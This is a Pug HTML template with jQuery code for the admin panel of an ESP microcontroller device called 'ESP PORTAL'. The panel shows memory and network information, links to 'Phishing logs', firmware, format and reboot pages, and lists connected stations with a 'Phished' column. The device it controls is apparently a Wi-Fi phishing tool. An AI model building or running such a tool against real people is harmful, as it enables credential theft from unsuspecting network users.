doctype html
html
  head
    meta(charset='utf-8')
    meta(http-equiv="content-type" content="text/html; charset=utf-8")
    meta(name='viewport', content='width=device-width, initial-scale=0.8, minimal-ui')
    title ESP PORTAL
    link(rel='stylesheet', href='/milligram.min.css')
    link(rel='stylesheet', href='/normalize.min.css')
    link(rel='stylesheet', href='/main.css')
    script(src='/jquery.slim.min.js')
    script(src='/main.js')

  body
    main.wrapper
    
      nav.navigation
        section.container
          .navigation-title
            a.button(href='/espportal') Home
          .float-right.navigation-title ESPORTAL
          
      section.container
        .row
          .column(style=("text-align: center;"))
              img(width='150' height='150' src="data:image/png;base64,")
            
        .row
          .column
            h1 Control ESP Portal
            .row
              .column
                h4 System memory info
                p(style=("margin: 0;"))
                  strong SPIFF 
                  | Total: 
                  span#total XXX
                  |  Kb |
                  | Free: 
                  span#free XXX
                  |  Kb |
                  | Used: 
                  span#used XXX
                  |  Kb
                p(style=("margin: 0;"))
                  |IP: 
                  span#IP_ESP XXX.XXX.X.X
                p(style=("margin: 0;"))
                  |Channel: 
                  span#CH_ESP XX
                p(style=("margin: 0;"))  
                  | MAC: 
                  span#MAC_ESP XX:XX:XX:XX:XX:XX
        
        
        br            
        .row
          .column
            h4 Commands
            .row.example
              
              .column
                
                ul
                  li(style="list-style-type: none;" )
                    a(href="/settings").button.button-outline Settings
                  li(style="list-style-type: none;" )
                    a(href="/viewlogs").button.button-outline Phishing logs
                  li(style="list-style-type: none;" ) 
                    a(href="/systemlogs").button.button-outline System logs
              .column
                ul
                  li(style="list-style-type: none;" ) 
                    a(href="/firmware").button Firmware
                  li(style="list-style-type: none;" ) 
                    a(href="/format").redirectjs.button Format 
                  li(style="list-style-type: none;" ) 
                    a(href="/reboot").redirectjs.button Reboot
        br  
        .row
          .column
            h4 Connected stations
            div(style=('overflow-x: scroll;'))
              table
                thead
                  tr
                    th MAC
                    |       
                    th IP
                    |       
                    th Phished
                |   
                tbody#deviceTable
script.
  function loadJsonConfig(){
    getFile("/json/system.json",function(res){
      console.log(res);
      var json = JSON.parse(res);
      if ($.isEmptyObject(json)) {
        alert("Setting Json is empty - it should not be!");
      }
      else 
      {
        console.log(json);
        var totalkB = Number(json.total)/1000;
        var usedkB = Number(json.used)/1000;
        var freekB = Number(json.freespace)/1000;
        
        $('#total').text(totalkB);
        $('#free').text(freekB);
        $('#used').text(usedkB);
        $('#IP_ESP').text(json.local_IP);
        $('#CH_ESP').text(json.channel);
        $('#MAC_ESP').text(json.local_mac);
        
  
        for (i = 0; i < json.numStationsConnected; i++) {
          console.log(json.numStationsConnected);
          var station = "/json?station="+json.listofConnectStations[i];
          console.log(station);
          getFile(station,function(res){
              var json = JSON.parse(res);
              console.log(json);
              $("#deviceTable").append('<tr><td>'+json.mac+'</td><td>'+json.ip+'</td><td>'+json.phished+'</td></tr>');
            });
          };
        } 
      
    });
  }
  function loadJsonIndex(){
    getFile("/json/getStations",function(res){
        console.log(res);
        var json = JSON.parse(res);
        console.log(json);
        $("#deviceTable").append('<tr><td>'+json.mac+'</td><td>'+json.ip+'</td><td>'+json.phished+'</td></tr>')
      });
    }
  
script.
  $(document).ready(function() {

    loadJsonConfig();
    
    $(".redirectjs").click(function(){
      setTimeout(function(){
        window.location.href = "/espportal";
      }, 20000);
    });
  });        
            
            
